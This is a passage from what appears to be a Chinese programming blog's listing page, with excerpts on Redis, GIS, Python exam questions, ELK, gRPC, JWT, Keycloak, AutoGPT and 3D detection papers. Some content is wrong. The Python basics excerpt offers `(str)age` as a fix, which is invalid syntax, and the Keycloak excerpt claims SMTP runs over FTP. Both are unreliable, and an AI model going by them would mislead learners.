可以是字符串对象也可以是集合数据类型的对象，比如List对象、Hash对象、Set对象和Zset对象 10大类型说明 传统的5大类型 StringListHashSetZSet 新的5大类型 bitmap -&gt; 实质StringhyperLogLog -&gt; 实质StringGEO -&gt; 实质ZsetStream -&gt; 实质Streambitfield -&gt; 具体看key 在Redis的逻辑中，服务（redisServer）启动加载数据库（redisDb），然后去读取字典（dict），然后去找哈希（dictht），就像Java中的那句——一切皆对象，在Redis中一切皆K-V（dict字典）。
Redis是由C语言编写的，想要深入了解Redis的数据结构，就不得不简单介绍下C语言的文件类型📃（因为接下来我们需要在一堆源码中找到我们需要的文件）和struct结构体（学习数据类型的底层实现）。
在C语言中，源代码文件通常以“.c”作为后缀名，以表示该文件包含C语言源代码。例如，如果编写一个名为“qin.c”的程序，那么它的源代码将保存在名为“qin.c”的文件中。C语言的头文件通常以“.h”作为后缀名，库文件通常以“.lib”或“.a”作为后缀名，可执行文件通常以“.exe”或“.out”作为后缀名。C语言的结构体，需要使用 struct 语句来定义，struct 语句定义了一个包含多个成员的新的数据类型，struct 语句的格式如下： struct [structure tag] { member definition; member definition; ... member definition; } [one or more structure variables]; structure tag 是可选的，每个 member definition 是标准的变量定义，在结构定义的末尾，最后一个分号之前，可以指定一个或多个结构变量（是可选的），举个🌰方便大家理解：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/691e1cbf3fe91ae4bd212597b7f4088b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/90f6e9b380c01ce787196deab14d01b4/" rel="bookmark">
			【GIS】1.什么是空间分析？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		新坑！！！
本系列文章主要参考CHICAGO大学的空间数据科学中心的相关课程(￣∇￣)/感谢分享～
什么是空间分析 空间分析不仅仅是指做一个地图这么简单，而是为这些位置空间添加实际的值，并通过对这些值的转换、计算等操作，以及应用一些分析方法来获取/发现更深层面的地理空间知识，使这些数据超越地图🗺️本身。
从原始数据转化成信息，然后演变成知识，甚至有可能演变智慧。
空间分析涉及的四个主题 在哪里发生？ 事件的发生在空间上有什么分布特征，不同区域之间的差异性和关联性等
为什么发生？ 决定在这个位置发生的背后原因是什么（因果关系）
发生的这些事件如何相互作用？ 某些事件发生在某个区域是如何影响该区域的其他因素的，反之，该区域的其他因素又是如何影响这些事件的（相互作用）
如何根据空间分析的结果进行决策？ 如何利用空间分析来优化决策，比如你想开一家医院🏥，在什么地方开会比较好，等等问题
什么时候会用到空间分析 空间分析中涉及到两类数据：一类是与地理位置相关的，一类是我们更熟悉的常规值和变量（属性信息）。
在非空间分析中，位置并不重要，这称为位置不变性，即即使你在空间中任意排列事物，结果是相同的。
而在空间分析中，改变位置会导致结果发生变化。
空间分析其实是一种数据科学（即是从数据中挖掘知识）
什么是数据科学 简单地说就是地理和科学的结合。
如果，那么这就定义了空间数据科学
计算社会科学已经将计算视为除了实验和观察之外的科学发现的第三种方法，例如模拟技术（simulation）、机器学习（machine learning）、数据挖掘（data mining）、视觉数据探索（visual data exploration）等。此外，随着数据驱动科学的第四范式的发展，大量的公司将数据用于科学研究，进一步进行产业化应用。而数据科学正是包括统计计算以及如何访问、转换、操作、探索、可视化和推理数据等方面，以挖掘出有用的信息、见解和应用模式的研究。
有一种比较有趣的说法，形容数据科学是黑客技术+数学/统计学知识+实质性专业知识三者的交集（如下图）。
简单理解，当正在分析和用于推断见解的数据本质上是空间数据，那么就构成了空间数据科学，But！标准数据科学和空间数据科学有一个很重要但常常被忽视的一个区别：
如何区分标准数据科学（standard data science）/ 常规分析 （regular analysis）和空间数据科学（spatial data science）/ 空间分析（spatial analysis）？
空间数据科学可以视为通用数据科学的子集，而标准数据科学和空间数据科学的区别是对于标准数据科学来说，空间数据只是一个附加的变量（不影响使用的分析方法），但是真正的空间数据科学是把距离位置、空间交互视作数据的核心方面，并因此采用专门的方法和软件对数据进行存储（store）、检索（retrieve）、探索（explore）、分析（analyze）、可视化（visualize） 和学习（learn）。即并不是说在机器学习中使用了经纬度就算得上是空间分析了，而是这些空间相关的变量变成了方法中的一部分，它们对你所使用的方法（methodology）产生了影响，这才能称之为真正的空间数据科学。
如下流程图展示了数据科学的基本处理过程：
我们解释下这个流程图：原始数据输入以后进行清洗（clean up），然后进入一个循环♻️（可视化、转换、建模进行循环交互），直到有你获得了一些推断见解，进而去向世界传达分享所发现的见解。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/035e57b68db94f01479ca6f3072f87ff/" rel="bookmark">
			python二级题库及答案解析,python二级题库百度网盘
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本篇文章给大家谈谈python二级题库及答案解析百度网盘，以及python二级题库有多少套2023年，希望对各位有所帮助，不要忘了收藏本站喔。
计算机二级python真题 文章目录 计算机二级python真题一、简单应用题——年龄统计二、综合应用题——《星座三问》 一、简单应用题——年龄统计 描述
实现以下功能：
键盘输入一组人员姓名、年龄、性别等信息,信息间采用空格分隔,每人一行,空行回车结束录入,示例格式如下：
张三 23 男
李四 21 女
王五 18 男
计算并输出这组人员的平均年龄(保留2位小数)和其中男性人数,格式如下:
平均年龄是20.67 男性人数是2
代码：
data = input() # 姓名 年龄 性别 all_num = 0 all_age = 0 man_num = 0 while data: all_num += 1 ls = data.split() all_age += int(ls[1]) if ls[2] == '男': man_num += 1 data = input() avg= all_age/all_num print("平均年龄是{:.2f} 男性人数是{}".format(avg,man_num)) 二、综合应用题——《星座三问》 本题对应三个问题,请按照文件内说明修改代码，实现以下功能:
二千多年前希腊的天文学家希巴克斯命名十二星座，它们是水瓶座、双鱼座、白羊座、金牛座、双子座、巨蟹座、狮子座、处女座、天秤座、天蝎座、射手座、魔蝎座。
给出一个CSV文件（PY301-SunSign.csv）内容示例如下:
序号，星座，开始月日，结束月日，Unicode
1，水瓶座，120,218,9810
2，双鱼座，219,320,9811
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/035e57b68db94f01479ca6f3072f87ff/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/908ce4d19bc46e58d943eeb7563a93ff/" rel="bookmark">
			计算机网络术语英文翻译 （部分图片来源于网络，如侵权请通知）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		verbose 英[vɜːˈbəʊs] 美[vɜːrˈboʊs]
adj. 冗长的; 啰唆的; 唠叨的;
【适用领域】 计算机网络、交换机
例：display mac-address verbose
例图：
comprehensive adj. 综合的; 全部的; 所有的; (几乎)无所不包的; 详尽的; 综合性的(接收各种资质的学生);
n. (英国为各种资质的学生设立的)综合中学;
出现场景：Nmap软件 suffix n. 后缀
ES:
ElasticSearch：分布式搜索和分析引擎；
Event Sourcing：事件溯源。
ECMAScript：是一种由Ecma国际（前身为欧洲计算机制造商协会）通过ECMA-262标准化的脚本程序设计语言，往往被称为JavaScript或JScript，但实际上后两者是ECMA-262标准的实现和扩展。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/59f48b10f119eed745197f0b24f0fdc2/" rel="bookmark">
			互联网一线大厂最新高质量 Java 面试八股文整理（附答案）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Java 面试 大家都知道，现在的 Java 面试是越来越难了！主要原因无非是两个：
随着 Java 这个行业的兴起，不管是在家待业的、对自己现在工作不满意的、大学选错专业的、缺钱的、想自己学的等等这些人绝大部分都是选择了去学习 Java！大量人才涌入，导致岗位竞争越来越大，面试也就越来越难！另外一个就是这两年的疫情影响，很多公司都宣布倒闭、裁员。加上互联网行业内卷的推动，面试造火箭工作拧螺丝已经是一个很常见的现象了！ 最近也是一直有粉丝朋友私信我说，2024都快来了，LZ 有没有一份内容全面，题目高频的面试题库，最近面试老挂，需要系统的梳理一下！我的内心：这我上哪儿整去啊！没办法好歹也是坐拥 5W 粉丝的小博主，粉丝就是我的上帝，于是熬夜 18 天为大家整理了一份 Java 全栈面试进阶宝典！希望对大家有所帮助！
不多 bb，来看
Java 全栈面试进阶宝典 JavaOOP/集合/泛型/异常/lO 与 NIO/反射/序列化/注解面试题 什么是 OOP?类与对象的关系?Java 中有几种数据类型标识符的命名规则。instanceof 关键字的作用什么是隐式转换，什么是显式转换Char 类型能不能转成 int 类型?能不能转化成 string 类能不能转成 double 类型Java 中异常分为哪两种?异常的处理机制有几种?如何自定义一个异常try catch fifinally,try 里有 return， finally 还执行么?ArrayList 和 linkedList 的区别HashMap 和 HashTable 的区别Collection 包结构，与 Collections 的区别泛型常用特点说说 List,Set,Map 三者的区别Array 与 ArrayList 有什么不一样?Map 有什么特点集合类存放于 Java.util 包中，主要有几种接口什么是 list 接口说说 ArrayList(数组)Vector（数组实现、线程同步)说说 LinkList(链表)什么 Set 集合java 反射的作用哪里会用到反射机制?反射的实现方式:实现 Java 反射的类:反射机制的优缺点:Java 反射 API反射使用步骤(获取 Class 对象、调用对象的方法)获取 Class 对象有几种方法利用反射动态创建对象实例什么是 java 序列化，如何实现 java 序列化?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/59f48b10f119eed745197f0b24f0fdc2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8e6a8a92b4fcdeb3c69e72aa467d8f0b/" rel="bookmark">
			ELK原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.ELK是什么 ELK 是指 Elasticsearch、Logstash 和 Kibana，它们通常一起使用以构建一个强大的日志分析和可视化系统。
Elasticsearch：
存储和检索： Elasticsearch 是一个分布式搜索引擎，用于存储和检索大量数据。它以 JSON 格式存储数据，并提供强大的全文搜索、聚合和分析功能。分布式性能： Elasticsearch 可以水平扩展，将数据分布在多个节点上，提高系统性能和容量。 Logstash：
数据收集： Logstash 用于数据的收集、过滤和转发。它能够从多种来源（如日志文件、数据库、消息队列）采集数据，并将数据送入 Elasticsearch 进行存储。数据处理： Logstash 允许用户配置各种插件来进行数据处理，例如过滤、清洗和格式化，以确保数据的一致性和质量。 Kibana：
可视化： Kibana 是 ELK Stack 的前端工具，提供了强大的可视化和分析功能。通过 Kibana，用户可以通过图表、仪表盘等方式直观地查看和分析 Elasticsearch 中的数据。查询语言： Kibana 使用 Elasticsearch 查询语言（EQL）来执行搜索和过滤数据，用户可以通过简单的查询语句实现复杂的数据分析。 2.工作原理 ELK Stack 的工作原理如下：
Elasticsearch:
Elasticsearch 是 ELK Stack 中的核心组件，负责存储、索引和搜索大量的结构化或半结构化数据。以下是 Elasticsearch 在 ELK 中的基本原理：
分布式搜索引擎： Elasticsearch 是一个分布式的搜索引擎，它将数据分布在多个节点上，提供水平扩展性。每个节点都可以存储数据，并参与搜索和分析操作。这种分布式架构使得 Elasticsearch 能够处理大规模的数据，并提供高性能和可用性。
索引和分片： 数据在 Elasticsearch 中以索引的形式存储。每个索引可以包含一个或多个分片，每个分片是一个独立的、可被分布在不同节点上的数据单元。分片的引入允许 Elasticsearch 在多个节点上并行处理搜索请求，提高性能。
文档存储： 数据以 JSON 格式的文档形式存储在 Elasticsearch 中。每个文档属于一个索引，并有一个唯一标识符（_id）。文档可以包含不同的字段，而这些字段可以被搜索、过滤和聚合。
倒排索引： Elasticsearch 使用倒排索引来加速搜索操作。倒排索引是一种将文档中的每个词映射到其出现位置的数据结构。这使得 Elasticsearch 能够非常快速地定位包含特定词的文档。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8e6a8a92b4fcdeb3c69e72aa467d8f0b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f305492613486070468f36767fdf27ae/" rel="bookmark">
			【Java】gRPC与Spring boot继承实现示例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		上篇文章介绍了如何通过一个简单的maven项目实现gRPC客户端与服务端通信协议测试。但是这个只是一个普通的Java工程，我们在Java web开发的今天大多数Java程序员都是通过SpringCloud及SpringBoot开启微服务或者单个应用的开发，我们最好通过springboot继承gRPC，这样一个工程既可以支持web开发，也可以支持gRPC协议通信。庆幸的是有大佬yidongnan早为我们准备好了grpc相关starter，对应的开源代码地址如下：
https://github.com/yidongnan/grpc-spring-boot-starter
grpc-client-spring-boot-starter：client端start，实现自动注入stub的实现
grpc-client-spring-boot-autoconfigure：client端grpc Springboot配置文件自动加载注入
grpc-server-spring-boot-starter：server端启动starter，实现自动注入XXXServiceGrpc
grpc-server-spring-boot-autoconfigure：server端grpc springboot配置文件自动加载注入
这里是大佬yidongnan维护的项目：gRPC-Spring-Boot-Starter 文档及源码
gRPC-Spring-Boot-Starter 文档 | grpc-spring 具体server端实现和client端实现完全可以参考大佬的examples，完全足够让你理解其实现的便捷性，你也可以按照其参考实现，提供maven和gradle两种构建方式。如果你在看的过程中还有些许不懂，下面是我按照自己的理解把之前gRPC逻辑重新实现了一下，看这篇文章之前，建议先看一下我之前的一篇文章：
【JAVA】protobuf在Java中代码测试用例-CSDN博客
我们主要做以下工作
创建一个父项目（springboot-rpc），包括以下几个module
定义服务调用接口程序（rpc-interface），一个普通工程创建server端Springboot服务（rpc- server），依赖接口程序创建client端Springboot服务（rpc-client），依赖接口程序 一、创建父项目
1.父项目pom.xml，在springboot-rpc工程配置子module需要用到的maven依赖
&lt;groupId&gt;org.example&lt;/groupId&gt; &lt;artifactId&gt;springboot-rpc&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;packaging&gt;pom&lt;/packaging&gt; &lt;modules&gt; &lt;module&gt;rpc-interface&lt;/module&gt; &lt;module&gt;rpc-server&lt;/module&gt; &lt;module&gt;rpc-client&lt;/module&gt; &lt;/modules&gt; &lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;grpc.version&gt;1.59.1&lt;/grpc.version&gt;&lt;!-- CURRENT_GRPC_VERSION --&gt; &lt;protobuf.version&gt;3.24.0&lt;/protobuf.version&gt; &lt;protoc.version&gt;3.24.0&lt;/protoc.version&gt; &lt;!-- required for JDK 8 --&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;/properties&gt; &lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;io.grpc&lt;/groupId&gt; &lt;artifactId&gt;grpc-netty-shaded&lt;/artifactId&gt; &lt;version&gt;${grpc.version}&lt;/version&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.grpc&lt;/groupId&gt; &lt;artifactId&gt;grpc-protobuf&lt;/artifactId&gt; &lt;version&gt;${grpc.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.grpc&lt;/groupId&gt; &lt;artifactId&gt;grpc-services&lt;/artifactId&gt; &lt;version&gt;${grpc.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.grpc&lt;/groupId&gt; &lt;artifactId&gt;grpc-stub&lt;/artifactId&gt; &lt;version&gt;${grpc.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f305492613486070468f36767fdf27ae/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b4c25accf28f422a7288c483bec36ffb/" rel="bookmark">
			解决问题：ERROR: No matching distribution found for torch==1.12.1&#43;cu102
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		conda虚拟环境安装pytorch10.2时出现报错： ERROR: Could not find a version that satisfies the requirement torch==1.12.1+cu102 (from versions: 1.7.0, 1.7.1, 1.8.0, 1.8.1, 1.9.0, 1.9.1, 1.10.0, 1.10.1, 1.10.2, 1.11.0, 1.12.0, 1.12.1, 1.13.0, 1.13.1)
ERROR: No matching distribution found for torch==1.12.1+cu102
WARNING: There was an error checking the latest version of pip.
查询网上资源，大概率版本不匹配问题，检查自己的cuda版本为10.1
更换安装代码后仍然出现问题，因此考虑python版本问题，此时版本为3.8
降级为3.7后，继续安装，报错消失。目前网上的安装教程很多都是旧版本，当python版本过高就会出现版本不支持的情况，对于学习pytorch基本原理，使用低版本的python和pytorch已经足够。 最近因为读研需要学习pytorch 框架，但无人指导，寻找了一份中文文档尝试使用jupyter notebook一边运行一边学习，链接在此，有需自取。zergtant/pytorch-handbook: pytorch handbook是一本开源的书籍，目标是帮助那些希望和使用PyTorch进行深度学习开发和研究的朋友快速入门，其中包含的Pytorch教程全部通过测试保证可以成功运行 (github.com)
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f679320867971814f08e59e084833af1/" rel="bookmark">
			python代码大全和用法,python入门基础代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这篇文章主要介绍了python代码大全和用法，具有一定借鉴价值，需要的朋友可以参考下。希望大家阅读完这篇文章后大有收获，下面让小编带着大家一起了解一下。
1、标识符和保留字
查看保留字：
import keyword print(keyword.kwlist) 标识符：以字母、数字、下划线组成数字不能开头不能以保留字命名严格区分大小写 2、变量（值可以被改变）
一个变量包括三部分：id、type、value它的类型type完全由等号右边的值的类型决定当对一个变量多次赋值以后，这个变量名会指向新的存储空间变量的命名遵循驼峰式命名法 name='小白' print('类型',type（name）) print('地址',id(name)) print('值',name) 3、常见的数据类型
整数类型-&gt;int-&gt;123浮点数类型-&gt;float-&gt;3.1415926布尔类型-&gt;bool-&gt;True、False字符串类型 -&gt;str-&gt;"Python ,I love you " 布尔值可以转换为整数：True=1 False=0 print(True+1)#2 print(False+1)#1 4、数据类型转换————三个函数
str()——将其他数据类型转成字符串类型int()——将其他数据类型转成整数类型float()——将其他数据类型转成浮点数型 name='张三' age=18 #这样写print('我叫'+name+'年龄'+age)会报错，因为在python中，str类型和int类型不能直接拼接,必须先将int类型转换为str类型，才可以 print('我叫'+name+'年龄'+(str)age)#将age进行一个类型转换，转换为str类型 5、input（）函数的使用
作用：接受用户从键盘输入的数据返回值类型：字符串类型str值的存储：使用=对输入的值进行存储 a=input('请您输入第一个整数')#10 b=input('请您输入第二个整数')#30 print(a+b)#结果为1030，可见只起到了字符串拼接的作用 a=int(input('请您输入第一个整数')) b=int(input('请您输入第二个整数')) print(a+b)#结果为40，类型转换以后可以进行相加 6、运算符
算术运算符：+、-、*、/(取商，即除法运算)、//（整除，只保留商的整数部分）、%（取余运算）、a**b(表示a的b次方)赋值运算符：=比较运算符：&gt;=、&lt;=、==、+=、-=等布尔运算符：and 、or、 not、 in、 not in位运算符：将数据转为二进制进行运算 整除特例：
print(9//4)#2 print(-9//-4)#2 #整除时，一正一负向下取整 print(-9//4)#-3 print(9//-4)#-3 取余特例（一正一负要遵循公式）： 余数=被除数-除数*商
print(9%4)#1 #一正一负时，公式为：余数=被除数-除数*商 print(-9%4)#-9-4*（-3）=3 print(9%-4)#-3=9-（-4）*（-3） 7、程序的组织结构
顺序结构选择结构循环结构 单分支结构：
if 条件表达式：
条件执行体
双分支结构：
if 条件表达式：
条件执行体1
else:
条件执行体2 多分支结构：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f679320867971814f08e59e084833af1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f165a2cd08e48c4d8eaa5a64d26aeefd/" rel="bookmark">
			最详细的jjwt工具类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		依赖：jjwt和jackson-databind的版本都至少需要2.10.5及以上 &lt;dependency&gt; &lt;groupId&gt;io.jsonwebtoken&lt;/groupId&gt; &lt;artifactId&gt;jjwt-api&lt;/artifactId&gt; &lt;version&gt;0.11.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.jsonwebtoken&lt;/groupId&gt; &lt;artifactId&gt;jjwt-impl&lt;/artifactId&gt; &lt;version&gt;0.11.2&lt;/version&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.jsonwebtoken&lt;/groupId&gt; &lt;artifactId&gt;jjwt-jackson&lt;/artifactId&gt; &lt;version&gt;0.11.2&lt;/version&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; &lt;version&gt;2.11.2&lt;/version&gt; &lt;/dependency&gt; jjwt的作用：是生成、解析和校验Json Web Token（JWT）。JWT是一种用于身份验证的令牌，由三部分组成：头部、载荷和签名。使用JWT可以保护API端点，允许用户进行无状态身份验证。
JJwtUtil.java
import io.jsonwebtoken.Claims; import io.jsonwebtoken.Jwts; import io.jsonwebtoken.SignatureAlgorithm; import io.jsonwebtoken.security.Keys; import org.springframework.beans.factory.annotation.Value; import org.springframework.stereotype.Component; import javax.crypto.SecretKey; import java.nio.charset.StandardCharsets; import java.util.Date; import java.util.HashMap; import java.util.Map; @Component public class JJwtUtil { private static final String USER_CLAIMS_KEY = "user"; // 过期时间 @Value("${jwt.expire-time}") private long EXPIRE_TIME; // 密钥 @Value("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f165a2cd08e48c4d8eaa5a64d26aeefd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fa4099a00f403367c17ee50bef32b582/" rel="bookmark">
			Keycloak邮箱验证设置SMTP服务教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 文章目录 SMTP简介开启邮箱SMTP服务首先进入自己的网易邮箱设置（这里以网易邮箱为例）开启SMTP服务，跟着页面提示操作就可以开启成功之后要记得保存授权密码，后面会用到 Keycloak配置邮件SMTP服务进入Keycloak后台管理页面，进入领域设置页面点击Email设置收件箱查看测试邮件 Keycloak通过邮箱验证找回用户密码返回登录页面点击找回密码输入用户邮箱信息并点击提交去收件箱找到发送的密码重置邮件点击修改密码链接，在新页面输入新密码然后点击提交提交之后进入后台管理页面，密码修改成功 SMTP简介 SMTP（Simple Mail Transfer Protocol，简单邮件传输协议）是一种提供可靠且有效的电子邮件传输协议，可通过 Internet 连接在用户账户之间传输电子邮件。SMTP是建立在FTP文件传输服务上的一种邮件服务，主要用于系统之间的邮件信息传递，并提供有关来信的通知，允许不同的电子邮件账户和客户端简化信息交换。
开启邮箱SMTP服务 首先进入自己的网易邮箱设置（这里以网易邮箱为例） 开启SMTP服务，跟着页面提示操作就可以 开启成功之后要记得保存授权密码，后面会用到 Keycloak配置邮件SMTP服务 进入Keycloak后台管理页面，进入领域设置页面点击Email设置 收件箱查看测试邮件 Keycloak通过邮箱验证找回用户密码 返回登录页面点击找回密码 输入用户邮箱信息并点击提交 去收件箱找到发送的密码重置邮件 点击修改密码链接，在新页面输入新密码然后点击提交 提交之后进入后台管理页面，密码修改成功 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4d8614f9d2e09aecfc7584df5a39ef2b/" rel="bookmark">
			大模型应用_AutoGPT
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 功能 整体功能，想解决什么问题
单独使用 ChatGPT 时，只提供基本的聊天，无法实现具体的功能，如果想提供某种功能，则需要结合程序实现。AutoGPT目标是建立和使用 AI Agent，设定一个或多个目标，AutoGPT自动拆解成相对应的任务，并派出 Agent 执行任务直到目标达成，无需编程。当前解决了什么问题，哪些问题解决不了
形成了较为完善的整体流程。在解决具体问题过程中，还需要人的进一步参与，仅使用 GPT 和简单的交互，还是不足以解决一般情况下遇到的问题。提供哪些功能点，其中哪些是刚需
建立Agent和整体调用流程是其核心功能。个人感觉这个工具并不求大而全，基本思路都是围绕其主功能扩展。除主功能以外，它还提供了：黑客马拉松，benchmark 基线 等功能，供二次开发者使用。用户使用难度，操作逻辑是否过于复杂
使用 docker 方式运行比较简单，只需要设置env，基本上是开箱即用；使用其前端需要进一步设置。具体工作时，虽然都是文本交互，但还是需要一些学习成本。 2 技术栈 技术栈是什么 前端使用 Dart+Flutter 开发，修改其前端有一定学习成本。Python 包管理使用 Poetry，依赖包在 pyproject.toml 中设置。LLM主要支持 OPENAI 的 GPT，使用的 openai 的 api 也比较旧。部署使用 docker + docker-compose主循环入口：autogpt/autogpt/app/main.py 现有底层工具消化了哪些常用功能 对外部强依赖较少，在配置文件env中可查看其可选组件 代码分析（使用cloc工具统计） docker 大小 1.99G代码下载 304M，其中主要占空间的是 .git 和 benchmark/reports/代码量（不计 json 文件和生成的js），其中 Python 24032行，dart 4590行，即以 Python 代码为主，包含少量前端界面；代码量不小，Python代码难度不高。核心代码：aotogpt/autogpt/autogpt目录下的python文件；其中 core 目录内容相对比较多，它的目标是重构 autogpt，尚在开发之中。 3 商业模式 AutoGPT 首先提供了一个完整的架构和可用的全功能。但它不是一个已经把各种问题解决的很好，拿来就能用的具体工具。从当前版本看，它更像是一个以架构为主，提供平台，希望大家开发和调优专门解决具体问题的 agent。并提供展示和比较的平台（黑客马拉松：Hackathon），各种 benchmark 基线（排行榜：https://leaderboard.agpt.co/），评测，底层结构和基本工具。
鼓励大家基于其架构开发解决具体问题的 agent，从而建立一种以Agent为核心的用大模型解决具体问题的生态。
4 安装 4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4d8614f9d2e09aecfc7584df5a39ef2b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/676df12af37b7a277222c5012cd2ebf3/" rel="bookmark">
			PETR系列(PETR,PETRv2,StreamPETR)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		paper发表地方代码链接Nuscenes_test(NDS)Nuscenes_val(NDS)PETRECCV2022pytorch代码0.5040.442PETRv2ICCV2023pytorch代码0.5910.524StreamPETRICCV2023pytorch代码0.6760.592 一、PETR: Position Embedding Transformation for Multi-View 3D Object Detection
出发点（DETR3D方法中存在的问题）：
DETR3D中通过预测的3D点投影到图像平面后获取图像特征，那么如果所预测的3D点不准确的话，获取到图像特征有可能不包含物体只是考虑了图像投影点周围的特征，没有考虑全局特征。
考虑到上述两个问题，作者想去设计一种不包含繁琐的2D-3D之间相互转换的检测框架。这其中需要解决的一个问题就是如何通过某种媒介来将2D图像特征转换成3D的感知特征。作者通过SR方法中低分辨率图像通过利用高分辨率图像中的一些信息来恢复高分辨率图像得到启发。通过将3D空间的位置编码特征融入到2D图像特征中来获取3D感知特征后用于最终的预测。 具体流程如下：
利用backbone提取图像特征，同时构建相机视锥体，之后利用外参将视锥坐标点转换到3D空间中，将图像特征和3D坐标输入到所设计的3D位置编码网络中来获取3D感知特征（这部分如下图所示）。之后将所生成的3D感知特征输入到Transformer中来的到最后的分类结果。
实验
验证所提出位置编码（3D坐标经过3D Position Embedding的输出）的有效性
通过利用前向摄像机图像所生成的位置编码中选取3个点，与其他方向的摄像机的位置编码进行相似度计算，最后可以得到如下结果，从图中可以看到所选取的点之和对应位置区域有响应（黄色区域），其他位置没有，证明了所提出位置编码的有效性。
同时作者比较利用原始2D位置编码或者融入图像序号的2D位置编码来代替所提出的3D位置编码实验结果如下表，说明利用3D位置编码的有效性
相机视锥空间的影响：
3D位置编码的影响 二、PETRv2: A Unified Framework for 3D Perception from Multi-Camera Images
PETRv2是将PETR扩展到时序模型以及BEV语义分割上的一个新的模型。这里主要说明一下PETRv2和PETR有什么不同。
PETRv2由于引入了时序的感念，所以需要进行时序上的对齐，之后将对齐后的坐标点拼接起来作为新的坐标点，过程如下：
P i l ( t ) = T c i ( t ) l ( t ) K i − 1 P m ( t ) \begin{align} P_i^l(t) = T_{c_i(t)}^{l(t)}K_i^{-1}P^m(t) \end{align} Pil​(t)=Tci​(t)l(t)​Ki−1​Pm(t)​​
首先利用上述公式将像素坐标转换到lidar坐标，之后将t-1时刻的坐标通过变换转移到t时刻的坐标，过程如下：
P i l ( t ) ( t − 1 ) = T l ( t − 1 ) l ( t ) P i l ( t − 1 ) ( t − 1 ) T l ( t − 1 ) l ( t ) = T e t l ( t ) T g e ( t ) T g e ( t − 1 ) − 1 T e ( t − 1 ) l ( t − 1 ) − 1 \begin{align} P_i^{l(t)}(t-1) = T_{l(t-1)}^{l(t)}P_i^{l(t-1)}(t-1)\\ T_{l(t-1)}^{l(t)} = T_{e{t}}^{l(t)}T_g^{e(t)}T_g^{e(t-1)^{-1}}T_{e(t-1)}^{l(t-1)^{-1}} \end{align} Pil(t)​(t−1)=Tl(t−1)l(t)​Pil(t−1)​(t−1)Tl(t−1)l(t)​=Tetl(t)​Tge(t)​Tge(t−1)−1​Te(t−1)l(t−1)−1​​​
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/676df12af37b7a277222c5012cd2ebf3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f58c2d704fe1cc322f6a3d6819771a59/" rel="bookmark">
			linux创建新用户
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
